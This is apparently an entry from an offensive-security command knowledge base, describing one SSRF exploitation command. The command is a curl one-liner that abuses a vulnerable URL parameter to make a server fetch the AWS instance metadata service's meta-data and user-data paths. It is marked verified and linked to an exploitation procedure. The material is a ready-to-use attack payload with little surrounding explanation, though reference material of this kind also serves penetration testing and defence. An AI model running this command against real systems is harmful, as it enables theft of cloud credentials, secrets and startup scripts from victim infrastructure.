---
type: command
executor: bash
data: >-
  curl "$_VULN_URL?target=http://169.254.169.254/latest/meta-data/" -v && curl
  "$_VULN_URL?target=http://169.254.169.254/latest/user-data/" -v
output: null
created_at: '2023-04-06T03:56:38Z'
updated_at: '2023-04-10T20:23:59Z'
platforms:
  - Web
  - AWS
tags:
  - ssrf
  - user-data
verified: true
validated: true
---

# curl-aws-metadata-paths

## Command

```bash
curl "$_VULN_URL?target=http://169.254.169.254/latest/meta-data/" -v && curl "$_VULN_URL?target=http://169.254.169.254/latest/user-data/" -v
```

## Description

Accesses metadata and user data paths via SSRF.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_VULN_URL | Vulnerable URL | Yes |

## Examples

### Basic Usage

As shown in command.

## Expected Output

Directory listings or script content.

## Related

- [[procedures/Exploit-SSRF-to-Access-AWS-Instance-Metadata]]
